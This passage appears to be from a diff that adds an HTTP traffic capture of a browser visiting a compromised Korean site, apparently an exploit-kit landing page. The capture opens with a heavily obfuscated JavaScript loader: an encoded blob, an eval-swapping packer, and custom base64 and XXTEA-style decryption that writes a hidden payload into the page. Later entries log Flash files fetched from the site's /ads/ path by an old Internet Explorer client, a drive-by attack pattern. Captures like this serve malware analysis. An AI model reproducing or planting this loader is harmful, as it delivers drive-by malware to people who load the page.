5ItaScRAH7P3DZmDzzMvCx4IyzcMapAQvSszJjgxLkL9UcMST4V0oHJPFhodcOGKMcz@rpQuj2p@eQ58Ajr4eQHpdfLZ3NBWrfKvkuAVtvGWu8wzB2dDczu1Gg69G7IpzOzvcMy16VQ2W8uE@0MXwV@yadfHeHX5ovhPNj2fCv4DNBR6eQtRwueCZ2NK@0x03@ZElsbKtPLx7s2YanJztIWmU0KYU10FMhgqb8UDBIFx3tONpMPtCZNs1ABzftNntY1awtVwedF6kfXLerGIYvSX3gEwFIJ2bALzokgfrkZOq1zeOAHLmAqR@56p1bzjj5QR@Lv73Tf5B03gqI3HBc2Lis2FGugXHjlR4TrVLCBTE7ldlCiMex4x6mlPnj5Cd3T2Wee@Wiz7DVtny65BBQbge1LTqzo7zaEIIzkthqRvSwwe0rVk@a57ywUnAebP3@iMlOPoGZt2r9TLddTkwl1n0DXxWEXWaIZAUxC@1s10Dt5mqPekXM5vDMPi5AJNZxJG0efRQkStej2us53J2mbJvVyoFxKEztKfyjg7FS62vyqD5YUQsq@PxK@YDssKPs82jOExSzYOR432riTvMG3l4t3ApejrgLo7Zbf02RVcONDDiMtggiJYEyrtro8@nquCskW68d@bdkxtWaKdtyF8ZJY8nnmz52ZtQFPB2HISxSlCezT61k@JDGP8ME1T5HLPbPJpjcjjUi1H9sKUTtodE4iSCgIXiVVcI37QRCSgURjTIhSWzHCn@MLNfJb4hlz42RCsaXWXbZ3nfiExd40Gs3sxng3x9Z5PmIg8IudTZA87vC6t1hX3VDlfIKRaf2CBtiv8s920wxM@taJkafZmi2CK1PaEChVEb1BoRWxsfc6nuGlaNuuaAQRtG8d@QcVKIg0x8C@YzLPDUC@DyVL53o@5SdalxJ1A@PSVHaJpi5R@OJYZgWcbj6QSVRwuhJQma0kIA7Vxqeen3DPP@eb@lUeWAxuXTT1jPNsEtcWTXB@AVlDum76Y1x78HxjK2XGVUORLervsLwv9utoheDHnqFqDxfNljTl9JIs0U8DPGbI@6kPBGxyJH7owX9dW3FSwwVGK1@HIgGlVsCQz2OH5y6jhs6887xLaz@IbednCyo5vHdo5Uzsq7TGClk31SBbD48FDyMtcZPybnh59Y45FVU8HF@fGr3pAdLWCaYbppbFBU7gizMgBILa9optsOYNJPuUgaNDVMpSkFpmH45eKRfzjXgYuZ509q8Y7tE6PaRuKmGJI5Vs4ieXfaHhCtVBOQHQcP9QWlYAOUGlVyOfqwy9ss2jVeYHVDA1YlQKwH0U6g1ZAeWi4@DY@RSsuVCDrH0ori@c8bfrYDaB30DgdVTIeG0TVJjwbccNXK7IC2Zn60ZyPfXz3xST8iUuqe6BMFviY7WO4ej1glOIPBhhbgTHTu0t8mBwO@2yOzaKbV2YlurLd5n3TiJo7z7PVqrZQDey1ZgFwUB7VWzyQcD1nDWs@Z0a42xYrqAmMOCeZ4IH7m1LjK7iKlZVQe2Rs8Ok9tWIfgYPfM5T8XtbZowMIONm1yfRfuamyQhAyQ9VL5mfkydfFFMI2VUbJhITM9ySK1UWh@lKLZxDFFiH9lsnbufd1O06AAHfSmtJqaeWDnHUTWgA8tmL6Exu1XqkLGRPNqwHBh5H@a4GbzuMwLyQveHQxbxiApPHbSghGXMJKppo@@@@@@@@@@@SG9XIfQVoqN3xIlve1S7MZtAYzQCbCYJiuO7GiuQKdUUAUemgXFKbAa4k3rQQ2kEi0RJHZ@FEe9RAveUoWf3lk76Vq@jwq9CUSu0OSB4OsyCDEs48KWTeSvsBQKumYtA16DSN0480y3JCBNvGMr6DFC0BhHR@rgngzhWPrCvZWLCKlGwvGukks9LRYA86X7uDyY17bW@jfKhjgOqASmWDXkG4aO1fWInJ5ZJERwSdVtmuUBGAoyHiHYEaYU370QwQ8NXhE@Ffi@dw8Sro8FAJhc90ISot6YGAaeP2OEiR49QoV5HoaguzUHnJz@U8L8eyIO@kJGGJ2cLECsbEEQ1N9oXVXtebQjJ0f2nuzmLid@P3qR3377@U4PX3K0ZBwGJsT@iXzMfNVeAnuChOwy1WqARguNaQDUE03tHIuNYUU1fu2LoqjPwh7wfMab@tr5P7CPQwepbxJX4hZJGYp9Ug4g3Vtt0duPmFT1M@es@TSDuAMEp6K1V@Rqb7CovdpEVGYSCCbir@FcPWSU2RHffyk6U393HwogoJZnQPVO0H5Fdx9xHSEc4IVmHbO0jyyraRn@0LgdZwUOdzQUKWM@S4lsvJ4gLixWlEHPR@CZgDdKYXpPoJXd9U2l1@6ZcpuVDWW5BrwY5TyfRSSDWmJyhbZWXzyBioYGNOtkL5NtxfOBhlFtI29HPBTlb2kiEbQmOCiJcsOEYAOR43XzA23p8KvRVz5VOCWeYbwnLhsb@mcVTnmvYjhK@VJGmWGQbjj3xTId@VKgOMyE9uMTnyVvrztQIRMhZAB6oN@3oHx@vQpyQpluMU@p7QtU@MOgGE0LICVF@j3eKoHZy1sP2XH9othg@HVHy9RS5bzVJErgNL8n@rmBWIdrckT5481qTk195mkQ0IqmYS8EoK04PNoGd@51qyzo69bGSRb4ltuChROjD7eLCkE7pQ@gVxy3LValaXmqe6bCTpfZj9pIvFcsFiItrvOtnrH@4BKiFK7XLBpz37BEoMAIsMBeW8bXsyuW8A2H4EUVt1udyh9ZYDUOxpvRqZ83nOHRM13w8cwNRNCV8Su5E0wQLwQLcoBdPlMfdg2Rne5iTaC5ue@true@Grlhi3DtRP5SiZVZvcVRjc97AjOT4N@kDy@PDcKxNUt4vJB0KH42qirY1aiGK0CTuC3@XG11AFm4Zn3kawrj2Ah9WZiZd7ZX0AKrnaH2ECi5Gx@iFZJ3rYidpGi@LrNQGt157oU@floor@dMKKjCCB6sh07ug2PvdBld9wh7dxCvPd5QYAN3oZhY@Math@b4Yi1ZMSHOFt@0x9E3779B9@wkhavfAwTjdP6h@3GWVt8K@IyLLaMlnvhY@BwnVhHOEF@oRioG@BfQLDBxlJGUX0dMaYTU2PGc8yhCELUaAZaQw6M7QKBYCfaI0W92zzeYPyxc3dNfyd9PaQoinD1s9haKlZoiecbdOQZnedKzUayUvvPw9ZDj7saDS0ds8Px4sCJJ@@@@@@@@@@@K1FJzKUWnskSAku8jEuWHl4jWjwioLwob1WKuh0w@Q5aq1PF@VhU4s3nnqbOoSVntfyh2SbvJ1yVlb36ZygpCmvs9fsEVycWWXQZ8GNO2rbwWZ5smDkvCo1oyQWQVAnTgjZ9imDgq@g8KbXHQhQvPOwaP1JmUMmyfmwNMAqZiRS2lKn7DJ9OYJ7ay9ok@rKFk2PGfyWlr18Wp@H9gXhhkCaIoeGxrH5B40DCfXmOpTyXWE0UnmfIN@uew4qv1iTBYYqKwEAkbWfj3X1i8HHgiuEf5Fr4qYFcODmXYVtuTdHaAdSFg@Vn3Y6EYEcPtClmRRCCbhz31g92PlodqooheY4@ezA6NNhVrJgY@lDORMZI0f7Vz2wd8ItXZCX2FlNLHZGcNrEiVqSU5oOo2f@kT7xC74@rBjIJtmPoETiua2WZWFjG8HYteiLsG4bQyFQuXlGTieOom8KV3PKJoDPNKnv49Rff6@g78LL74DNXFoSjHqrarmM4gaIDfpQSEjNYPQhUb@iPDIuNwYxwDxOnF2tp0oKK6qD9fmHS7nzl5ejX@wuarCTLlnPLn@1q4w2l8AK@Ul57DFZJo2BcqdiMBknI5p@xBmOzqFpgTAoSRHdtmnwtyqvohOTyF@FFnKZ7EM7VbZs6dWsjWYzHkgN6lZMZHVsrmK@UOVI6phVcscmlbpCk5eW2ZJNnKdu0pau8HrtgTCgvH5jhztq9uJowUZSt@YXtJOb758h5P6sUtGJjonskgGwZC8OSB@yVoIPnMUMu@n40svWLBHKmzybzJe4nSCLiPAgacFoxsa5l9TY@dihqEq@k4q@BuEHCrBgw85QCfDf1r8jMBCsYxq2V53PdG1@QAVmqd@7WXGoQH7ZyXTbZe',xmP76x,C69df3E,xmPpPub0='\x40',C69df3E3='\x73\x70'+'\x6C'+'\x69'+'\x74';try{window['alert'](a,b,c);}catch(e){xmP76x=eval;C69df3E=xmP76x;}try{alert(e,f,g);}catch(e){/*VIPNB*/C69df3E(/*11.11*/function(/*NB JS's VIP*/p,/*NB JS's VIP*/a,/*NB JS's VIP*/c,/*478188809*/k,/*NB JS's VIP*/e,/*NB JS's VIP*/d/*NB JS's VIP*/){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('a 1m=2w,Q=1m(\'u\'+\'2x\'+\'2v\'+\'e\'),1d=\'%31\'+\'%32\'+\'%33\'+\'%34\'+\'%35\'+\'%36\'+\'%37\'+\'%38\',S=\'%2u\'+\'%2r\'+\'%L\'+\'%2s\'+\'%2t\'+\'%1h\'+\'%2y%1i\',1j=\'2z/2F/2G+2E/2D/+2A/2B+2C/2q/2p/2e+2f/2d/2c/1Z/2a/2b/2g+2h+2n/2o/2m/2l/2i/2j/2k/2H/2I+3g//3h/3f+3e+3b/3c+3d+3i+3j/3o+3p/3n/3m+3k++3l++3a+2Z/2O+2P+2N+2M/2J/2K+2L+2Q/2R/2X/2Y/2W/2V/2S+2T+2U+1Y/3q+1H/1s+1r/1u/1D/1w/1C/1y+1x\',O=\'%1z\'+\'%1A%1B%1i\'+\'%1h\',1a;M 1l(d){a b,i,f,c;a K,U;b=[];f=d.j;i=0;B(i<f){c=d.g(i++);1v(c>>4){h 0:h 1:h 2:h 3:h 4:h 5:h 6:h 7:b[b.j]=d.1t(i-1);C;h 12:h 13:K=d.g(i++);b[b.j]=E[\'R\'](((c&1q)<<6)|(K&1b));C;h 14:K=d.g(i++);U=d.g(i++);b[b.j]=E[\'1X\'+\'1R\'+\'1Q\'+\'1P\'](((c&1S)<<12)|((K&1b)<<6)|((U&1b)<<0));C}}o b.V(\'\')}a 1e=\'%39\'+\'%L\'+\'%1c\'+\'%L\'+\'%1c\'+\'%L\'+\'%1c\';a I=1T 1W(-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,1V,-1,-1,-1,L,52,53,54,55,56,57,58,59,1U,Y,-1,-1,-1,-1,-1,-1,-1,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,-1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1);S=Q(S);M 1o(d){a J,D,l,r;a i,f,b;f=d.j;i=0;b="";B(i<f){N{J=I[d.g(i++)&x]}B(i<f&&J==-1);m(J==-1)C;N{D=I[d.g(i++)&x]}B(i<f&&D==-1);m(D==-1)C;b+=E.R((J<<2)|((D&1O)>>4));N{l=d.g(i++)&x;m(l==Y)o b;l=I[l]}B(i<f&&l==-1);m(l==-1)C;b+=E.R(((D&1N)<<4)|((l&1E)>>2));N{r=d.g(i++)&x;m(r==Y)o b;r=I[r]}B(i<f&&r==-1);m(r==-1)C;b+=E[\'1G\'+\'1F\'+\'1I\'](((l&3r)<<6)|r)}o b}M 1k(v,w){a Z=v.j;a 1n=v[Z-1]&F;T(a i=0;i<Z;i++){v[i]=E.R(v[i]&x,v[i]>>>8&x,v[i]>>>16&x,v[i]>>>24&x)}m(w){o v.V(\'\').1L(0,1n)}1K{o v.V(\'\')}}M W(s,w){a f=s.j;a v=[];T(a i=0;i<f;i+=4){v[i>>2]=s.g(i)|s.g(i+1)<<8|s.g(i+2)<<16|s.g(i+3)<<24}m(w){v[v.j]=f}o v}1a=Q(1d+1e);M 1p(d,1g){m(d==""){o""}a v=W(d,1f);a k=W(1g,1f);a n=v.j-1;a z=v[n-1],y=v[0],X=4T;a H,e,q=4R.4P(6+52/(n+1)),A=q*X&F;B(A!=0){e=A>>>2&3;T(a p=n;p>0;p--){z=v[p-1];H=(z>>>5^y<<2)+(y>>>3^z<<4)^(A^y)+(k[p&3^e]^z);y=v[p]=v[p]-H&F}z=v[n];H=(z>>>5^y<<2)+(y>>>3^z<<4)^(A^y)+(k[p&3^e]^z);y=v[0]=v[0]-H&F;A=A-X&F}o 1k(v,4I)}O=Q(O);t=\'5c+5p/5v/5u+5t+3v/3D+3C/3A/3B/3U/3V/4p+4o+4n+4m+4q/4r+4w/4v/4u+4s/4t+4k+4j/4a+4b+3Z/3Y+3W/3X/4c+4d/4i/4h/4g/4e+4f/4x/P/3E+3z+3y+3t+3s+3u/3x+3w/3F+3G+3Q+\'+1j+\'+G+3P/3R+3S+3T/3O+3N/3I+3H+3J+3K+3M+3L+4y/5b+5l+5k+5m/5n+5o//5j/5i+5e/5d/5f/5g/5h/5q+q/5y+5z+5A/5B/+5w+5x+5s+5r+4H+4K+4L+4G/4F/4A/4z+4B+4C+4E+4D+4M/4N/4X/4Y+4Z+5a/4V/4U+4O/4Q/1J/4J/4W+4S+4l\';t=1l(1p(1o(t),1a));1M[S][O](t);',62,348,xmPpPuD[C69df3E3](xmPpPub0),0,{}))}function ckls(){return "JB2kHkHkgFPKLKLkkkkkkKwBPBLBLBwBkBLB2kkBmBxBLBLBlBFB2BmKwBFBLBxKLBmkgkgkFKLBPBmkBBmKwByk2Bygggg";}..</script>
+]]></text>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T02:04:54</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:04:53.763</lastAccess>
+			<eTag></eTag>
+			<hitCount>3</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T02:59:50</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:59:49.786</lastAccess>
+			<eTag></eTag>
+			<hitCount>5</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.024</blocked>
+		<send started="0.024">0.001</send>
+		<wait started="0.025">0.005</wait>
+		<receive started="0.031">0.003</receive>
+		<ttfb started="0.024">0.006</ttfb>
+		<network started="0.024">0.010</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/swfobject.js">
+	<pageref idref="page_5" />
+	<started>00:54:56.132</started>
+	<startedDateTime>2017-01-19T11:59:49.735</startedDateTime>
+	<time>0.008</time>
+	<sent>378</sent>
+	<received>185</received>	<result>304</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/swfobject.js</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:49.735 (local time)</action>
+		<action name="HTTP Request" status="Completed">Check if modified since &apos;Wed, 18 Jan 2017 14:01:54 GMT&apos;</action>
+		<action name="HTTP Response" status="Completed">Only headers returned as content has not changed</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/swfobject.js HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="If-Modified-Since">Wed, 18 Jan 2017 14:01:54 GMT</header>
+			<header name="If-None-Match">&quot;19c0d84-3150-5465edbf59c0f&quot;</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/YrGaEs.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 304 Not Modified</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:48 GMT</header>
+			<header name="ETag">&quot;19c0d84-3150-5465edbf59c0f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=96</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>12624</contentLength>
+			<mimeType>application/javascript</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:01:54</lastModification>
+			<lastCacheUpdate>2017-01-19T02:04:52</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:04:53.763</lastAccess>
+			<eTag>&quot;19c0d84-3150-5465edbf59c0f&quot;</eTag>
+			<hitCount>4</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:01:54</lastModification>
+			<lastCacheUpdate>2017-01-19T02:59:50</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:59:49.796</lastAccess>
+			<eTag>&quot;19c0d84-3150-5465edbf59c0f&quot;</eTag>
+			<hitCount>7</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.004</blocked>
+		<send started="0.004">0.000</send>
+		<wait started="0.004">0.003</wait>
+		<receive started="0.008">0.000</receive>
+		<cache_read started="0.008">0.000</cache_read>
+		<ttfb started="0.004">0.003</ttfb>
+		<network started="0.004">0.003</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/logo.swf">
+	<pageref idref="page_5" />
+	<started>00:54:56.217</started>
+	<startedDateTime>2017-01-19T11:59:49.820</startedDateTime>
+	<time>0.006</time>
+	<sent>311</sent>
+	<received>422</received>	<result>404</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:49.820 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/logo.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko-KR</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/YrGaEs.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+			<header name="x-flash-version">15,0,0,152</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 404 Not Found</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">210</header>
+			<header name="Content-Type">text/html; charset=iso-8859-1</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:48 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=95</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>210</contentLength>
+			<text><![CDATA[
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /ads/logo.swf was not found on this server.</p>.</body></html>.
+]]></text>
+			<mimeType>text/html; charset=iso-8859-1</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.000</blocked>
+		<send started="0.000">0.000</send>
+		<wait started="0.000">0.005</wait>
+		<receive started="0.005">0.000</receive>
+		<ttfb started="0.000">0.005</ttfb>
+		<network started="0.000">0.005</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/cam_do.swf">
+	<pageref idref="page_6" />
+	<started>00:55:01.121</started>
+	<startedDateTime>2017-01-19T11:59:54.724</startedDateTime>
+	<time>0.026</time>
+	<sent>307</sent>
+	<received>424</received>	<result>404</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/cam_do.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:54.724 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/cam_do.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/cam_do.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 404 Not Found</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">212</header>
+			<header name="Content-Type">text/html; charset=iso-8859-1</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:53 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=94</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>212</contentLength>
+			<text><![CDATA[
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /ads/cam_do.swf was not found on this server.</p>.</body></html>.
+]]></text>
+			<mimeType>text/html; charset=iso-8859-1</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.020</blocked>
+		<send started="0.020">0.001</send>
+		<wait started="0.021">0.004</wait>
+		<receive started="0.025">0.000</receive>
+		<ttfb started="0.020">0.005</ttfb>
+		<network started="0.020">0.005</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/bin_do.swf">
+	<pageref idref="page_7" />
+	<started>00:55:05.577</started>
+	<startedDateTime>2017-01-19T11:59:59.180</startedDateTime>
+	<time>0.033</time>
+	<sent>307</sent>
+	<received>9738</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/bin_do.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:59.180 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/bin_do.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/bin_do.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">9428</header>
+			<header name="Content-Type">application/x-shockwave-flash</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:58 GMT</header>
+			<header name="ETag">&quot;19c0a21-24d4-5465ed8de421f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=93</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:01:02 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>9428</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.021</blocked>
+		<send started="0.021">0.001</send>
+		<wait started="0.022">0.005</wait>
+		<receive started="0.027">0.005</receive>
+		<ttfb started="0.021">0.006</ttfb>
+		<network started="0.021">0.012</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/bin_do.swf">
+	<pageref idref="page_7" />
+	<started>00:55:05.635</started>
+	<startedDateTime>2017-01-19T11:59:59.238</startedDateTime>
+	<time>0.012</time>
+	<sent>0</sent>
+	<received>0</received>	<result>(Cache)</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/bin_do.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:59.238 (local time)</action>
+		<action name="Read Cache" status="Completed">Content read from browser cache</action>
+	</overview>
+	<request>
+		<requestMethod></requestMethod>
+		<cookies></cookies>
+		<headers></headers>
+	</request>
+	<response>
+		<responseStatus></responseStatus>
+		<cookies></cookies>
+		<headers></headers>
+		<content>
+			<contentLength>9428</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:01:02</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:00</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:59:59.250</lastAccess>
+			<eTag>&quot;19c0a21-24d4-5465ed8de421f&quot;</eTag>
+			<hitCount>1</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:01:02</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:00</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:59:59.270</lastAccess>
+			<eTag>&quot;19c0a21-24d4-5465ed8de421f&quot;</eTag>
+			<hitCount>4</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<cache_read started="0.000">0.012</cache_read>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ad_do.swf">
+	<pageref idref="page_8" />
+	<started>00:55:09.910</started>
+	<startedDateTime>2017-01-19T12:00:03.513</startedDateTime>
+	<time>0.042</time>
+	<sent>306</sent>
+	<received>9897</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ad_do.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:03.513 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ad_do.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ad_do.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">9587</header>
+			<header name="Content-Type">application/x-shockwave-flash</header>
+			<header name="Date">Thu, 19 Jan 2017 03:00:02 GMT</header>
+			<header name="ETag">&quot;19c07ea-2573-5465ed868c3ff&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=92</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:00:55 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>9587</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.022</blocked>
+		<send started="0.022">0.001</send>
+		<wait started="0.024">0.004</wait>
+		<receive started="0.029">0.013</receive>
+		<ttfb started="0.022">0.006</ttfb>
+		<network started="0.022">0.019</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ad_do.swf">
+	<pageref idref="page_8" />
+	<started>00:55:09.986</started>
+	<startedDateTime>2017-01-19T12:00:03.589</startedDateTime>
+	<time>0.013</time>
+	<sent>0</sent>
+	<received>0</received>	<result>(Cache)</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ad_do.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:00:03.589 (local time)</action>
+		<action name="Read Cache" status="Completed">Content read from browser cache</action>
+	</overview>
+	<request>
